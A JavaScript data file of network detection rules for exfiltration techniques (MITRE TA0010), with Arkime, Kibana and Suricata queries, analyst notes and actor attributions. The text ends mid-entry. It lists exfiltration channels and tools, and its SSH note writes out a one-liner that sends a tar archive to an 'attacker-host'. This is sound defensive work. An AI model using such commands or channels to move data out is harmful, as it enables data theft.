// TA0010 - Exfiltration
// 11 techniques · 15 indicators · Egress-focused detection

const DATA = [
  {
    id: "T1041",
    name: "Exfiltration Over C2 Channel",
    desc: "Volume anomalies on established C2 channel - bytes-out ratio, HTTPS POST bursts, DNS tunneling",
    rows: [
      {
        sub: "T1041 - Volume Ratio Anomaly",
        indicator: "Outbound TLS session - extreme bytes-out / bytes-in ratio",
        arkime: `ip.src == $INTERNAL
&& ip.dst == $EXTERNAL
&& port.dst == 443
&& bytes-src > 104857600
&& bytes-src / bytes-dst > 50`,
        kibana: `source.ip: $INTERNAL
AND destination.ip: NOT $INTERNAL
AND destination.port: 443
AND source.bytes > 104857600
AND ratio_calc: source.bytes/destination.bytes > 50`,
        suricata: `[Suricata can flag total bytes per
flow, but bytes-out:bytes-in ratio
calculation across long flows is
typically done in Zeek (conn.log
orig_bytes vs resp_bytes ratio)
or in SIEM aggregation queries.]
Use Zeek + SIEM for ratio detection.`,
        notes: "Normal HTTPS browsing has bytes-in HEAVILY exceeding bytes-out - you download web pages, images, video; you upload tiny request headers and the occasional form submission. Typical legitimate ratio is 1:10 to 1:100 (out:in). Exfiltration over HTTPS inverts this: you're sending data to a server that's just acknowledging receipt with small responses. Detection: outbound flows with bytes_out > 100MB AND bytes_out > 50× bytes_in over the session lifetime. Tunable threshold - adjust based on your environment's normal upload patterns (cloud backup users, content creators, video uploaders all skew higher upload volumes legitimately). Pair with destination reputation: known-good destinations (Google Drive, Dropbox, OneDrive when sanctioned) are allowlist; ratios to unknown destinations are high-priority alerts. Zeek's conn.log has orig_bytes and resp_bytes fields - aggregate across flows per source IP per destination IP per hour for clean ratio detection.",
        apt: [
          { cls: "apt-mul", name: "Ransomware", note: "Ransomware double-extortion typically exfils through HTTPS C2 before encryption." },
          { cls: "apt-ru", name: "APT29", note: "Documented in SolarWinds and ongoing operations." },
          { cls: "apt-cn", name: "APT41", note: "HTTPS-based exfil in operations against multiple sectors." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Documented in CISA AA23-320A operations." },
          { cls: "apt-mul", name: "Multi", note: "Universal across modern operations using HTTPS C2 infrastructure." }
        ],
        cite: "MITRE ATT&CK T1041, CISA AA23-320A"
      },
      {
        sub: "T1041 - HTTPS POST Burst",
        indicator: "HTTPS POST volume burst - sustained large POST requests to single destination",
        arkime: `ip.src == $INTERNAL
&& port.dst == 443
&& http.method == POST
&& http.request-body-size > 1048576
&& count groupby [ip.src, ip.dst]
   > 50 within 600s`,
        kibana: `source.ip: $INTERNAL
AND destination.port: 443
AND http.request.method: "POST"
AND http.request.body.bytes > 1048576`,
        suricata: `alert tls $HOME_NET any
  -> $EXTERNAL_NET 443
  (msg:"TA0010 T1041 HTTPS POST
    burst large bodies sustained
    exfiltration over C2";
  flow:established,to_server;
  threshold:type both,
    track by_src,
    count 50, seconds 600;
  classtype:trojan-activity;
  sid:9104101; rev:1;)`,
        notes: "Many C2 frameworks (Cobalt Strike, Sliver, Mythic, Brute Ratel) chunk exfil data into POST requests with bodies in the 1-5MB range to avoid triggering single-large-flow detections. The pattern: 50+ POST requests to the same destination within 10 minutes, each with bodies >1MB. This is rarely legitimate behavior - even file uploads to legitimate services (Google Drive, Dropbox) typically use multipart upload protocols that produce different patterns. Detection at the POST count + body size aggregate is high-confidence. Pair with destination IP reputation and TLS certificate/SNI patterns from C2 detection (TA0011) - exfil over already-classified C2 destinations is essentially confirmed exfil. For TLS-decrypted environments, the body content itself can reveal archive headers (PK for ZIP, Rar! for RAR) - high-fidelity content match.",
        apt: [
          { cls: "apt-mul", name: "Ransomware", note: "Standard pattern in Cobalt Strike-based ransomware operations." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Documented in CISA AA23-320A operations." },
          { cls: "apt-ru", name: "APT29", note: "HTTPS POST chunking documented in espionage operations." },
          { cls: "apt-mul", name: "Cobalt Strike Operators", note: "Standard Cobalt Strike profile exfil pattern." },
          { cls: "apt-mul", name: "Multi", note: "Documented across virtually all modern C2 framework operations." }
        ],
        cite: "MITRE ATT&CK T1041"
      },
      {
        sub: "T1041 - DNS Tunneling Exfil",
        indicator: "DNS tunneling exfiltration - high-volume TXT/A query patterns to single domain",
        arkime: `ip.src == $INTERNAL
&& port.dst == 53
&& protocols == dns
&& dns.query-length > 50
&& unique-subdomain-count groupby
  [ip.src, dns.parent-domain]
   > 100 within 600s`,
        kibana: `source.ip: $INTERNAL
AND destination.port: 53
AND dns.question.name.length > 50`,
        suricata: `alert udp $HOME_NET any
  -> any 53
  (msg:"TA0010 T1041 DNS tunneling
    exfil high subdomain unique
    count single parent domain";
  content:"|01 00 00 01|"; depth:8;
  threshold:type both,
    track by_src,
    count 100, seconds 600;
  classtype:trojan-activity;
  sid:9104102; rev:1;)`,
        notes: "DNS tunneling encodes data into DNS queries - typically as base32/base64-encoded subdomains under an attacker-controlled parent domain. Each query exfils a small chunk; thousands of queries exfil a meaningful payload. Tools: dnscat2, iodine, DNSExfiltrator, custom. Pattern: many unique subdomains under one parent domain, queries longer than typical (50+ characters), high query rate from one source. Detection: aggregate unique subdomain count per (source, parent_domain) - legitimate DNS rarely exceeds 20-30 unique subdomains under one parent in a 10-minute window. Some legitimate services trigger false positives (CDNs, security products with DNS-based reputation lookups, email anti-spam services) - build allowlists for known-good parent domains. Zeek's dns.log captures all of this beautifully; SIEM aggregation queries are the right detection layer. DNS tunneling is slow but extraordinarily stealthy - many environments don't egress-monitor DNS at all, making it a preferred channel for high-stealth operations.",
        apt: [
          { cls: "apt-ir", name: "APT34", note: "DNS tunneling documented in OilRig operations against Middle Eastern targets." },
          { cls: "apt-cn", name: "APT41", note: "DNS-based C2/exfil in sustained operations." },
          { cls: "apt-ru", name: "Turla", note: "DNS tunneling extensively used in espionage operations." },
          { cls: "apt-mul", name: "Stealth Operators", note: "Preferred for high-stealth long-term collection." },
          { cls: "apt-mul", name: "Multi", note: "Documented across advanced persistent threats requiring covert exfiltration." }
        ],
        cite: "MITRE ATT&CK T1041, T1071.004"
      }
    ]
  },
  {
    id: "T1048.002",
    name: "Exfil Over Asymmetric Encrypted Non-C2 Protocol",
    desc: "SSH/SCP/SFTP outbound to non-allowlisted destinations",
    rows: [
      {
        sub: "T1048.002 - SSH Outbound",
        indicator: "Outbound SSH session - large bytes-out to non-allowlisted external destination",
        arkime: `ip.src == $INTERNAL
&& ip.dst == $EXTERNAL
&& port.dst == 22
&& ip.dst != $SANCTIONED_SSH_DESTS
&& bytes-src > 52428800`,
        kibana: `source.ip: $INTERNAL
AND destination.ip: NOT $INTERNAL
AND destination.port: 22
AND NOT destination.ip: $SANCTIONED_SSH_DESTS
AND source.bytes > 52428800`,
        suricata: `alert tcp $HOME_NET any
  -> $EXTERNAL_NET 22
  (msg:"TA0010 T1048.002 outbound
    SSH large transfer external
    asymmetric exfil";
  flow:established,to_server;
  content:"SSH-"; depth:4;
  classtype:trojan-activity;
  sid:9104802; rev:1;)`,
        notes: "SSH/SCP/SFTP for exfil is one of the most common adversary patterns when SSH egress is allowed (which it often is, for legitimate developer/admin use). Detection: outbound SSH (TCP/22) to destinations NOT on your sanctioned-destinations allowlist, with significant bytes_out. Build $SANCTIONED_SSH_DESTS to include: GitHub, GitLab, AWS bastions, sanctioned cloud providers - wherever your devs legitimately SSH. Anything else outbound on port 22 is highly suspicious. Adversary tooling often uses port 22 specifically because of how rarely it's restricted: Mega CLI, custom scp wrappers, rclone with SSH backend, or just 'tar cz | ssh attacker-host cat > stolen.tar.gz'. Volume threshold of 50MB+ catches realistic exfil while filtering out short admin SSH sessions. Pair with destination IP geolocation - SSH to residential IP addresses or hosting providers known for VPS abuse is high-priority. Modern best practice: SSH egress should be allowlisted to specific destinations at the firewall/proxy level, not relying on detection alone.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "SSH-based exfil documented in operations against tech sector and cloud-native targets." },
          { cls: "apt-kp", name: "Lazarus", note: "SSH exfil for cryptocurrency-related theft operations." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Documented in CISA AA23-320A operations targeting cloud infrastructure." },
          { cls: "apt-mul", name: "Multi", note: "Common across operations targeting Linux/cloud infrastructure." }
        ],
        cite: "MITRE ATT&CK T1048.002"
      }
    ]
  },
  {
    id: "T1048.003",
    name: "Exfil Over Unencrypted Non-C2 Protocol",
    desc: "FTP STOR uploads, outbound SMB to internet - unencrypted protocol exfiltration",
    rows: [
      {
        sub: "T1048.003 - FTP STOR Upload",
        indicator: "Outbound FTP / FTPS data transfer - STOR commands with large file sizes",
        arkime: `ip.src == $INTERNAL
&& port.dst == [21 || 990]
&& protocols == ftp
&& ftp.command == STOR
&& ftp.bytes-transferred > 10485760`,
        kibana: `source.ip: $INTERNAL
AND destination.port: (21 OR 990)
AND ftp.command: "STOR"
AND ftp.bytes > 10485760`,
        suricata: `alert tcp $HOME_NET any
  -> $EXTERNAL_NET [21,990]
  (msg:"TA0010 T1048.003 FTP STOR
    outbound file upload
    unencrypted exfil";
  flow:established,to_server;
  content:"STOR "; depth:5; nocase;
  classtype:trojan-activity;
  sid:9104803; rev:1;)`,
        notes: "FTP for exfil is common in two scenarios: (1) opportunistic - adversary uses whatever's available and outbound TCP/21 isn't blocked, (2) deliberate - older malware (APT class going back years) used FTP because it was reliable across firewall configs. Modern environments should block outbound FTP entirely; if you can't, this signature catches what gets through. Detection: FTP STOR commands (file upload) with significant bytes transferred. Zeek's ftp.log captures command, filename, response code, and bytes. False positives: legitimate FTP to sanctioned partners (build $SANCTIONED_FTP allowlist), automated industry-specific FTP (still common in healthcare, finance for legacy data exchange). FTPS on port 990 is encrypted but produces same signature on the control channel. Pair with destination reputation and filename patterns - uploads with archive extensions are particularly suspicious.",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "FTP exfil documented in Fancy Bear operations across multiple campaigns." },
          { cls: "apt-cn", name: "APT10", note: "FTP-based exfil in MSS-aligned operations." },
          { cls: "apt-mul", name: "Older Malware Families", note: "Many older RAT families default to FTP for stolen data." },
          { cls: "apt-mul", name: "Multi", note: "Persists in environments where FTP egress remains available." }
        ],
        cite: "MITRE ATT&CK T1048.003"
      },
      {
        sub: "T1048.003 - Outbound SMB",
        indicator: "Outbound SMB - TCP/445 to external destination",
        arkime: `ip.src == $INTERNAL
&& ip.dst == $EXTERNAL
&& port.dst == 445
&& protocols == smb`,
        kibana: `source.ip: $INTERNAL
AND destination.ip: NOT $INTERNAL
AND destination.port: 445`,
        suricata: `alert tcp $HOME_NET any
  -> $EXTERNAL_NET 445
  (msg:"TA0010 T1048.003 outbound
    SMB to external destination
    extremely anomalous";
  flow:established,to_server;
  content:"|fe|SMB"; depth:4;
  classtype:trojan-activity;
  sid:9104804; rev:1;)`,
        notes: "Outbound SMB to the internet is essentially always either malicious or misconfigured. Legitimate SMB traffic stays internal - even cloud storage providers (Azure Files, AWS FSx) typically front their SMB endpoints with VPN/private link, not raw internet exposure. Detection: any TCP/445 to non-internal destinations. Common scenarios: (1) NTLM hash capture by external attacker (file:// URL in phishing email triggers SMB connect to attacker server), (2) deliberate SMB-as-exfil (rare but used by some operators for data transfer to attacker SMB servers), (3) misconfigured app trying to connect to attacker-typo'd hostname. Modern best practice: BLOCK outbound SMB at the firewall - it's near-zero false positive impact and shuts down a whole class of attacks. If you can't block, this detection is essentially zero-false-positive in most environments. Pair with destination reputation: residential IPs, hosting providers, and recently-registered domains with SMB ports open are high-priority.",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "Outbound SMB used historically for NTLM relay and credential capture." },
          { cls: "apt-mul", name: "Phishing Operators", note: "file:// URL phishing triggers outbound SMB to attacker server for hash capture." },
          { cls: "apt-mul", name: "NTLM Hash Capturers", note: "Standard external Net-NTLMv2 capture vector." },
          { cls: "apt-mul", name: "Multi", note: "Documented across phishing campaigns leveraging file:// URLs and external SMB servers." }
        ],
        cite: "MITRE ATT&CK T1048.003, T1187"
      }
    ]
  },
  {
    id: "T1048.001",
    name: "Exfil Over Symmetric Encrypted Non-C2 Protocol",
    desc: "Custom encryption channels - high-entropy outbound on non-TLS ports",
    rows: [
      {
        sub: "T1048.001 - Custom Encryption",
        indicator: "High-entropy outbound payloads on non-TLS port - custom encryption signature",
        arkime: `ip.src == $INTERNAL
&& ip.dst == $EXTERNAL
&& port.dst != [443 || 22 || 8443]
&& bytes-src > 10485760
&& payload-entropy > 7.5`,
        kibana: `source.ip: $INTERNAL
AND destination.ip: NOT $INTERNAL
AND NOT destination.port: (443 OR 22 OR 8443)
AND source.bytes > 10485760
AND network.bytes_entropy > 7.5`,
        suricata: `[High-entropy detection requires
flow content analysis - typically
implemented in Zeek scripts that
calculate Shannon entropy across
flow payloads, or in dedicated
ML-based NDR platforms.
Suricata stream content can be
sampled for entropy via Lua scripts
but full-flow entropy calculation
is better suited for Zeek.]
N/A pure Suricata`,
        notes: "When adversaries don't use standard TLS - to avoid TLS fingerprinting, JA3 detection, or because their malware is older - they often roll their own encryption: AES-CBC with hardcoded keys, RC4, XOR with a long key, or simple stream ciphers. The result on the wire is high-entropy traffic that LOOKS encrypted but isn't using SSL/TLS. Detection: outbound flows with payload entropy >7.5 (close to maximum 8.0 for fully random data) on non-standard-encrypted ports. Zeek can compute this via custom scripts; commercial NDR platforms (Corelight, ExtraHop, Vectra) typically include this as a feature. False positives: compressed file transfers (gzip, lz4), already-encrypted archives being moved (T1560.001), some media streaming protocols with custom codecs. Combine with: destination reputation, process correlation if EDR is available, anomalous port usage. Particularly useful for catching APT-class custom malware C2/exfil channels that don't show up on TLS-based detection.",
        apt: [
          { cls: "apt-ru", name: "Turla", note: "Custom crypto extensively used in long-term espionage operations." },
          { cls: "apt-cn", name: "Winnti", note: "Custom-encrypted C2/exfil channels in operations against tech sector." },
          { cls: "apt-kp", name: "Lazarus", note: "Multiple custom-encrypted communication protocols documented." },
          { cls: "apt-mul", name: "Custom Malware Operators", note: "Bespoke encryption documented across advanced threat operations." },
          { cls: "apt-mul", name: "Multi", note: "Common in APT-class operations seeking to evade TLS-based detection." }
        ],
        cite: "MITRE ATT&CK T1048.001"
      }
    ]
  },
  {
    id: "T1567.002",
    name: "Exfil Over Web Service: Cloud Storage",
    desc: "Mega, Anonfiles, Bunkr - exfil-friendly cloud storage destinations and mainstream cloud volume anomalies",
    rows: [
      {
        sub: "T1567.002 - Exfil-Friendly Cloud Storage",
        indicator: "Outbound TLS to known exfil-friendly cloud storage - Mega, Anonfiles, Bunkr, etc.",
        arkime: `ip.src == $INTERNAL
&& port.dst == 443
&& tls.sni == [
  *mega.nz*
  || *mega.io*
  || *anonfiles.com*
  || *bunkr.*
  || *gofile.io*
  || *filebin.net*
  || *catbox.moe*
  || *1fichier.com*
  || *file.io*
]`,
        kibana: `source.ip: $INTERNAL
AND destination.port: 443
AND tls.client.server_name: (*mega.nz OR *mega.io OR *anonfiles* OR *bunkr* OR *gofile* OR *filebin* OR *catbox* OR *1fichier* OR *file.io)`,
        suricata: `alert tls $HOME_NET any
  -> $EXTERNAL_NET 443
  (msg:"TA0010 T1567.002 TLS to
    exfil-friendly cloud storage
    Mega Anonfiles Bunkr etc";
  flow:established,to_server;
  tls.sni; pcre:"/(mega\\.nz|
    mega\\.io|anonfiles|bunkr|
    gofile|filebin|catbox|
    1fichier|file\\.io)/i";
  classtype:trojan-activity;
  sid:9156702; rev:1;)`,
        notes: "Mega, Anonfiles (defunct as of 2023 but successors exist), Bunkr, Gofile, Filebin, Catbox, 1Fichier, file.io - these services share traits adversaries love: anonymous upload, large file size limits, no/minimal account requirements, often privacy-focused so they resist law enforcement. Mega in particular is heavily used in ransomware double-extortion (Conti, BlackCat, Scattered Spider all documented Mega exfil). Detection: outbound TLS with SNI matching this list. Treat any hit as high-priority - these services are essentially never legitimately used in business contexts. Some users might have personal accounts they shouldn't be using on corp networks; even those cases are policy violations worth investigating. Pair with volume - even small uploads to Mega from a workstation are suspicious; large uploads are essentially confirmed exfil. Modern best practice: block these destinations at the proxy/firewall entirely. Detection becomes a 'verify the block is working' activity.",
        apt: [
          { cls: "apt-mul", name: "Ransomware", note: "Mega heavily used in modern ransomware double-extortion." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Documented in CISA AA23-320A operations." },
          { cls: "apt-mul", name: "Conti", note: "Mega documented as primary exfil destination in many Conti operations." },
          { cls: "apt-mul", name: "BlackCat", note: "Mega and similar services in BlackCat/ALPHV operations." },
          { cls: "apt-mul", name: "Multi", note: "LockBit and most major ransomware affiliates documented using these services." }
        ],
        cite: "MITRE ATT&CK T1567.002, CISA AA23-320A"
      },
      {
        sub: "T1567.002 - Mainstream Cloud Volume Anomaly",
        indicator: "Outbound TLS to mainstream cloud storage with high upload volume",
        arkime: `ip.src == $INTERNAL
&& port.dst == 443
&& tls.sni == [
  *.dropbox.com
  || *.dropboxusercontent.com
  || *onedrive.live.com*
  || *files.1drv.com*
  || *drive.google.com*
  || *docs.google.com*
]
&& bytes-src > 1073741824
&& bytes-src / bytes-dst > 50`,
        kibana: `source.ip: $INTERNAL
AND destination.port: 443
AND tls.client.server_name: (*dropbox* OR *onedrive* OR *1drv* OR *drive.google* OR *docs.google*)
AND source.bytes > 1073741824`,
        suricata: `[Detection requires aggregation
of bytes_out per (source IP, SNI)
across the flow lifetime, plus
ratio comparison. Best done in
SIEM queries against Zeek conn.log
joined with ssl.log SNI data.
Suricata can flag SNI matches but
not high-volume aggregations.]
SNI match only via Suricata`,
        notes: "Dropbox, OneDrive, Google Drive are legitimate services your users probably DO use. Detection isn't about the destination - it's about VOLUME and asymmetry. A legitimate Dropbox user might upload 100MB occasionally; an exfil operation pushes 1GB+ in a session. Build per-user or per-source-IP baselines if possible: outliers exceeding 95th percentile of normal upload volume are worth investigating. False positives: legitimate large uploads (videos, design assets, dataset uploads for ML, backup activities) - these should be predictable per-user. Cloud-side detection is more precise (Microsoft 365 audit logs, Google Workspace audit logs, Dropbox business audit logs) and SHOULD be your primary detection layer for these services - but network-side catches the egress side and provides correlation. Modern best practice: enforce sanctioned cloud storage via DLP/CASB; restrict personal accounts via tenant-restriction headers in proxies.",
        apt: [
          { cls: "apt-mul", name: "Scattered Spider", note: "Dropbox/OneDrive used in CISA AA23-320A operations." },
          { cls: "apt-ru", name: "APT29", note: "Cloud storage in long-term espionage operations." },
          { cls: "apt-cn", name: "APT41", note: "Mainstream cloud services as exfil destinations." },
          { cls: "apt-mul", name: "Insider Threat", note: "Common pattern in insider data theft using personal cloud accounts." },
          { cls: "apt-mul", name: "Multi", note: "Documented across virtually all modern operations." }
        ],
        cite: "MITRE ATT&CK T1567.002"
      }
    ]
  },
  {
    id: "T1567.001",
    name: "Exfil Over Web Service: Code Repository",
    desc: "GitHub/GitLab/Bitbucket as exfil destination - large uploads from non-developer sources",
    rows: [
      {
        sub: "T1567.001 - Code Repo Exfil",
        indicator: "Outbound TLS to GitHub/GitLab/Bitbucket - anomalous high upload volume from non-developer source",
        arkime: `ip.src == $INTERNAL
&& ip.src != $DEVELOPER_HOSTS
&& port.dst == 443
&& tls.sni == [
  *github.com*
  || *gitlab.com*
  || *bitbucket.org*
  || *gitea.*
  || *codeberg.org*
]
&& bytes-src > 52428800`,
        kibana: `source.ip: $INTERNAL
AND NOT source.ip: $DEVELOPER_HOSTS
AND destination.port: 443
AND tls.client.server_name: (*github.com OR *gitlab.com OR *bitbucket.org)
AND source.bytes > 52428800`,
        suricata: `alert tls $HOME_NET any
  -> $EXTERNAL_NET 443
  (msg:"TA0010 T1567.001 TLS to
    code repository large upload
    non-developer source";
  flow:established,to_server;
  tls.sni; pcre:"/(github\\.com|
    gitlab\\.com|bitbucket\\.org|
    gitea|codeberg)/i";
  classtype:trojan-activity;
  sid:9156701; rev:1;)`,
        notes: "Adversaries push exfil data to GitHub/GitLab as either: (1) a private repo they control, (2) a Gist, (3) a public repo with steganographic encoding. Detection: significant outbound volume (>50MB) from a workstation that ISN'T on your developer allowlist ($DEVELOPER_HOSTS). Developers legitimately push large amounts to git hosts; HR analysts and finance users do not. Particularly suspicious: TLS sessions with GitHub from an exec or finance laptop. False positives possible: developer running personal projects on work machine (policy violation worth reviewing), corporate use of GitHub Actions or CI/CD that pushes from non-dev hosts (allowlist these specific services). For high-stealth scenarios, adversaries split exfil into many small commits across many small files - volume detection misses this; pair with anomalous Git activity from non-dev sources at any volume.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "GitHub as exfil destination in cryptocurrency-targeted operations." },
          { cls: "apt-cn", name: "APT41", note: "Source code exfil to attacker-controlled repos in operations against tech sector." },
          { cls: "apt-mul", name: "Insider Threat", note: "Developer departures involving repo theft to personal GitHub accounts." },
          { cls: "apt-mul", name: "Multi", note: "Increasingly common as adversaries leverage trusted services for exfil." }
        ],
        cite: "MITRE ATT&CK T1567.001"
      }
    ]
  },
  {
    id: "T1567.003",
    name: "Exfil Over Web Service: Text Storage Sites",
    desc: "Pastebin, transfer.sh, ix.io - paste and temporary file storage for exfil",
    rows: [
      {
        sub: "T1567.003 - Paste Site Exfil",
        indicator: "Outbound TLS to paste / temporary file sites - Pastebin, transfer.sh, ix.io, etc.",
        arkime: `ip.src == $INTERNAL
&& port.dst == 443
&& tls.sni == [
  *pastebin.com*
  || *paste.ee*
  || *transfer.sh*
  || *ix.io*
  || *dpaste.com*
  || *hastebin.com*
  || *ghostbin.*
  || *0bin.net*
  || *privatebin.*
]`,
        kibana: `source.ip: $INTERNAL
AND destination.port: 443
AND tls.client.server_name: (*pastebin* OR *paste.ee OR *transfer.sh OR *ix.io OR *dpaste* OR *hastebin* OR *ghostbin* OR *0bin* OR *privatebin*)`,
        suricata: `alert tls $HOME_NET any
  -> $EXTERNAL_NET 443
  (msg:"TA0010 T1567.003 TLS to
    paste site exfil destination";
  flow:established,to_server;
  tls.sni; pcre:"/(pastebin|
    paste\\.ee|transfer\\.sh|
    ix\\.io|dpaste|hastebin|
    ghostbin|0bin|privatebin)/i";
  classtype:trojan-activity;
  sid:9156703; rev:1;)`,
        notes: "Paste sites and temporary file shares (transfer.sh - files auto-delete, Pastebin - text up to 512KB, ix.io - command-line-friendly) appeal to adversaries because: (1) anonymous, (2) often allow large content, (3) frequently bypass corporate DLP that focuses on cloud storage. Some are deliberate command-line-friendly (curl-based usage), making them well-suited to scripted exfil. Detection: outbound TLS to these specific destinations. Hits are high-priority - these services are rarely legitimately used in business contexts. Modern best practice: block these destinations at the proxy. False positives: developers occasionally use Pastebin or transfer.sh for legitimate sharing (tune by user role); some IRC/forum communities reference paste sites. Pair with volume - even small uploads (text-only paste of credentials, config files) are concerning. Encrypted pastes (PrivateBin) are particularly suspicious because they actively prevent inspection.",
        apt: [
          { cls: "apt-mul", name: "Cybercrime", note: "Paste sites used heavily across cybercrime operations for credential/data exfil." },
          { cls: "apt-mul", name: "Stealer Malware", note: "RedLine, Raccoon, Vidar all documented using paste sites." },
          { cls: "apt-mul", name: "Multi", note: "Documented across many DFIR reports as common exfil destination for infostealers." }
        ],
        cite: "MITRE ATT&CK T1567.003"
      }
    ]
  },
  {
    id: "T1567.004",
    name: "Exfil Over Web Service: Webhook",
    desc: "Discord, Slack, Telegram webhook endpoints - modern dominant infostealer exfil pattern",
    rows: [
      {
        sub: "T1567.004 - Discord Webhook Exfil",
        indicator: "Outbound TLS to Discord webhook endpoint - POST to /api/webhooks/",
        arkime: `ip.src == $INTERNAL
&& port.dst == 443
&& (tls.sni == [*discord.com*, *discordapp.com*]
    || (http.host == "*discord*"
        && http.uri == "*/api/webhooks/*"
        && http.method == POST))`,
        kibana: `source.ip: $INTERNAL
AND destination.port: 443
AND tls.client.server_name: (*discord.com OR *discordapp.com)
AND http.request.method: "POST"
AND url.path: */api/webhooks/*`,
        suricata: `alert tls $HOME_NET any
  -> $EXTERNAL_NET 443
  (msg:"TA0010 T1567.004 TLS to
    Discord webhook endpoint
    exfil over webhook";
  flow:established,to_server;
  tls.sni; content:"discord";
  classtype:trojan-activity;
  sid:9156704; rev:1;)`,
        notes: "Discord webhooks have become one of the most common exfil channels for infostealer malware in 2024-2026. Why: (1) Discord is allowed in many corporate environments (gaming companies, community-focused businesses, marketing teams), (2) webhooks need no auth - just a URL - so they're trivial to use in malware, (3) Discord's TLS termination at discord.com or discordapp.com looks like normal user traffic. The /api/webhooks/{id}/{token} URI pattern is the giveaway - webhooks live at this path and POST requests carry the exfil payload. RedLine, Raccoon, Vidar, AsyncRAT, and dozens of other commodity malware families now default to Discord webhooks for exfil. Detection: any POST to discord.com/api/webhooks/. If your environment legitimately uses Discord (e.g., for community ops, dev integrations), allowlist specific webhook IDs you know about; everything else is high-priority. Same pattern applies to Slack incoming webhooks (hooks.slack.com/services/) and Telegram bot APIs (api.telegram.org/bot{token}). Pair with volume and source IP - exfil-via-webhook is increasingly seen on workstations where users have been phished into running stealer malware.",
        apt: [
          { cls: "apt-mul", name: "Stealer Malware", note: "Discord webhooks dominant exfil pattern in modern commodity malware." },
          { cls: "apt-mul", name: "RedLine", note: "Default Discord webhook exfil in many RedLine variants." },
          { cls: "apt-mul", name: "Raccoon", note: "Discord webhook integration in Raccoon Stealer operations." },
          { cls: "apt-mul", name: "Cybercrime", note: "LummaC2, MetaStealer, Vidar all documented using Discord webhooks." },
          { cls: "apt-mul", name: "Multi", note: "One of the dominant exfil patterns in modern commodity malware (2023-2026)." }
        ],
        cite: "MITRE ATT&CK T1567.004"
      }
    ]
  },
  {
    id: "T1029",
    name: "Scheduled Transfer",
    desc: "Off-hours and timed exfiltration patterns from workstation sources",
    rows: [
      {
        sub: "T1029 - Off-Hours Workstation Exfil",
        indicator: "Outbound large transfer at off-hours from workstation source",
        arkime: `ip.src == $WORKSTATIONS
&& ip.dst == $EXTERNAL
&& bytes-src > 104857600
&& time-of-day == [00:00..06:00 || 22:00..23:59]
&& day-of-week != [saturday || sunday]`,
        kibana: `source.ip: $WORKSTATIONS
AND destination.ip: NOT $INTERNAL
AND source.bytes > 104857600
AND @timestamp.hour: (0 OR 1 OR 2 OR 3 OR 4 OR 5 OR 22 OR 23)`,
        suricata: `[Time-of-day filtering is typically
done in SIEM correlation rules
rather than Suricata signatures.
Suricata can detect the volume,
but time-context filtering happens
at log analysis layer in Kibana
or Splunk based on @timestamp.]
SIEM-side detection`,
        notes: "Workstations should not be uploading 100MB+ to external destinations at 03:00 AM on a Tuesday. Servers might (backups, automated reports) but should be tightly allowlisted. Detection: aggregate outbound volume per workstation source per hour, alert when off-hours volume exceeds threshold. Build $WORKSTATIONS to distinguish from servers/cloud-connected systems with legitimate scheduled traffic. Adversaries deliberately schedule exfil for off-hours when SOC coverage is reduced and user activity is low (less noise to hide in but also less observation). Ironically, the off-hours scheduling intended for stealth becomes a detection signal in environments with proper time-aware monitoring. Pair with destination reputation, day-of-week (weekend off-hours are even more suspicious for non-weekend-worker users), and user activity correlation (no recent keyboard/mouse activity per EDR + large outbound transfer = high confidence).",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Off-hours scheduled exfil documented in long-term espionage including SolarWinds." },
          { cls: "apt-cn", name: "APT41", note: "Scheduled exfil patterns in sustained operations." },
          { cls: "apt-mul", name: "Stealth Operators", note: "Standard pattern for adversaries minimizing detection during active SOC hours." },
          { cls: "apt-mul", name: "Multi", note: "Common across long-term espionage and patient-attacker operations." }
        ],
        cite: "MITRE ATT&CK T1029"
      }
    ]
  },
  {
    id: "T1030",
    name: "Data Transfer Size Limits",
    desc: "Chunked exfiltration - many medium-sized flows aggregating to large total volume",
    rows: [
      {
        sub: "T1030 - Chunked Exfiltration",
        indicator: "Many small-medium outbound flows to single destination - chunk-pattern exfil",
        arkime: `ip.src == $INTERNAL
&& ip.dst == $EXTERNAL
&& port.dst == 443
&& bytes-src in [524288..10485760]
&& flow-count groupby [ip.src, ip.dst]
   > 100 within 3600s
&& sum(bytes-src) groupby [ip.src, ip.dst]
   > 524288000`,
        kibana: `source.ip: $INTERNAL
AND destination.ip: NOT $INTERNAL
AND destination.port: 443
AND source.bytes: [524288 TO 10485760]`,
        suricata: `[Chunk pattern detection requires
flow aggregation across time -
typically implemented in SIEM
correlation queries that count
flows per source-destination pair
within a window AND sum total
bytes. Suricata's per-flow model
doesn't natively support this
multi-flow aggregation logic.]
SIEM-side aggregation`,
        notes: "Adversaries aware of bulk-volume detections deliberately chunk exfil: each session stays under a threshold (1MB-10MB), but they make 100+ sessions to the same destination. Net result: hundreds of MB or GB exfiltrated, but no individual flow trips a 'large transfer' alert. Detection requires AGGREGATION: per (source, destination) tuple, count flows AND sum bytes across an hourly window. Alert when flow count exceeds 100 AND aggregate bytes exceed 500MB to a single destination - this is essentially diagnostic of chunked exfil. False positives: legitimate APIs that produce chatty traffic (cloud sync, certain SaaS apps) - build per-application baselines. Particularly relevant when destination is a known exfil-friendly service (combine with T1567 destination matching). The chunk-size sweet spot for adversaries is typically 1-5MB per chunk: small enough to avoid bulk-flow detection, large enough to exfil meaningful data without taking days. Detection threshold should match this range.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Chunked exfil documented in SolarWinds operations." },
          { cls: "apt-cn", name: "APT41", note: "Chunking patterns in operations against tech sector." },
          { cls: "apt-ir", name: "APT34", note: "Documented chunking to evade volume-based detection." },
          { cls: "apt-mul", name: "Stealth Operators", note: "Standard evasion technique against bulk-flow detection." },
          { cls: "apt-mul", name: "Multi", note: "Documented across long-term espionage operations." }
        ],
        cite: "MITRE ATT&CK T1030"
      }
    ]
  },
  {
    id: "T1020",
    name: "Automated Exfiltration",
    desc: "Beacon-style timing regularity - automation/scripted exfil signatures",
    rows: [
      {
        sub: "T1020 - Automation Timing Signature",
        indicator: "Highly-regular periodic outbound flows - automation timing fingerprint",
        arkime: `ip.src == $INTERNAL
&& ip.dst == $EXTERNAL
&& flow-interval-stddev groupby
